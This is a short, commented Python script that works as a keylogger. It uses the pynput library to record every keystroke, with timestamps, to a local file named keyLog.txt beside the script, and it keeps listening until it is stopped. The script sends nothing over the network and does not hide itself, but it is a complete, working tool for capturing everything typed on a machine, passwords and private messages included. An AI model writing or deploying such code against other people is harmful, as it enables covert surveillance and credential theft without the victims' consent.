# Import the necessary modules
import pynput
from pynput.keyboard import Key, Listener
import logging
import os

# Define the directory where the log file will be saved
log_dir = os.path.dirname(os.path.abspath(__file__))

# Configure logging settings
logging.basicConfig(
    filename=(log_dir + r"/keyLog.txt"),  # Set the log file path
    level=logging.DEBUG,                  # Set the logging level to DEBUG
    format='%(asctime)s : %(message)s'    # Define the log message format
)

# This function is called when a key is pressed
def on_press(key):
    logging.info(str(key))  # Log the key that was pressed

# Create a Listener object that will monitor key presses and call on_press() when a key is pressed
with Listener(on_press=on_press) as listener:
    listener.join()  # Start listening for key presses and keep the script running
